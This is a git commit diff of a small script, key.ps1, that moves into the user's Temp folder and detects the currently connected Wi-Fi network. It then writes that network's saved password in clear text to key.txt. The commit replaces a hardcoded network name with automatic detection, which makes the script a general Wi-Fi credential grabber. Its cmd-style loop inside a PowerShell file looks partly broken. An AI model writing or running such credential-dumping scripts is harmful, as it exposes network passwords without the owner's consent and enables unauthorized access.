33ec24e8fc0dc2d6760d4bdaf4fc9643862fd156
DennisMejicanos <dennis.mejicanos@galileo.edu>
2019-10-26 15:17:32 -0600

    Update key.ps1

--- key.ps1
+++ key.ps1
@@ -1,4 +1,4 @@
 cd AppData\Local\Temp
+for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
 netsh wlan show profile > key.txt
-netsh wlan show profile name=FAMILIA_MEJICANOS key=clear >> key.txt
-
+netsh wlan show profile %A% key=clear >> key.txt
